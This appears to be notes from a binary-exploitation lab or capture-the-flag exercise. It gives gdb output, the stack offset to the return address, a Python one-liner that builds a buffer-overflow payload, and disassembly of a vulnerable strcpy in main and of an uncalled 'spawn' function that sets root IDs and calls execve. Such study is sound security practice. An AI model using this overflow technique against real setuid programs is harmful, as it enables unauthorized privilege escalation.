rsp => 7ffc72ca3598
buffer start => 7ffc72ca3550
buffer + rbp = 72

$(python -c "print 'A'*72 + 'B'*6")

gdb-peda$ info funct
All defined functions:

Non-debugging symbols:
0x0000000000000618  _init
0x0000000000000640  strcpy@plt
0x0000000000000650  puts@plt
0x0000000000000660  execve@plt
0x0000000000000670  setegid@plt
0x0000000000000680  seteuid@plt
0x0000000000000690  __cxa_finalize@plt
0x00000000000006a0  _start
0x00000000000006d0  deregister_tm_clones
0x0000000000000710  register_tm_clones
0x0000000000000760  __do_global_dtors_aux
0x00000000000007a0  frame_dummy
0x00000000000007d0  spawn
0x0000000000000813  main
0x0000000000000860  __libc_csu_init
0x00000000000008d0  __libc_csu_fini
0x00000000000008d4  _fini

Dump of assembler code for function main:
   0x0000000000000813 <+0>:	push   rbp
   0x0000000000000814 <+1>:	mov    rbp,rsp
   0x0000000000000817 <+4>:	sub    rsp,0x50
   0x000000000000081b <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x000000000000081e <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000000822 <+15>:	cmp    DWORD PTR [rbp-0x44],0x2
   0x0000000000000826 <+19>:	jne    0x84e <main+59>
   0x0000000000000828 <+21>:	mov    rax,QWORD PTR [rbp-0x50]
   0x000000000000082c <+25>:	add    rax,0x8
   0x0000000000000830 <+29>:	mov    rdx,QWORD PTR [rax]
   0x0000000000000833 <+32>:	lea    rax,[rbp-0x40]
   0x0000000000000837 <+36>:	mov    rsi,rdx
   0x000000000000083a <+39>:	mov    rdi,rax
   0x000000000000083d <+42>:	call   0x640 <strcpy@plt>
   0x0000000000000842 <+47>:	lea    rax,[rbp-0x40]
   0x0000000000000846 <+51>:	mov    rdi,rax
   0x0000000000000849 <+54>:	call   0x650 <puts@plt>
   0x000000000000084e <+59>:	mov    eax,0x0
   0x0000000000000853 <+64>:	leave  
   0x0000000000000854 <+65>:	ret    
End of assembler dump.

SPAWN FUNCTION NEVER CALLED WHICH DOES EVERYTHING NEEDED:
Dump of assembler code for function spawn:
   0x00000000000007d0 <+0>:	push   rbp
   0x00000000000007d1 <+1>:	mov    rbp,rsp
   0x00000000000007d4 <+4>:	sub    rsp,0x10
   0x00000000000007d8 <+8>:	mov    DWORD PTR [rbp-0x4],0x0
   0x00000000000007df <+15>:	mov    DWORD PTR [rbp-0x8],0x0
   0x00000000000007e6 <+22>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000000007e9 <+25>:	mov    edi,eax
   0x00000000000007eb <+27>:	call   0x680 <seteuid@plt>
   0x00000000000007f0 <+32>:	mov    eax,DWORD PTR [rbp-0x8]
   0x00000000000007f3 <+35>:	mov    edi,eax
   0x00000000000007f5 <+37>:	call   0x670 <setegid@plt>
   0x00000000000007fa <+42>:	mov    edx,0x0
   0x00000000000007ff <+47>:	mov    esi,0x0
   0x0000000000000804 <+52>:	lea    rdi,[rip+0xd9]        # 0x8e4
   0x000000000000080b <+59>:	call   0x660 <execve@plt>
   0x0000000000000810 <+64>:	nop
   0x0000000000000811 <+65>:	leave  
   0x0000000000000812 <+66>:	ret    
End of assembler dump.
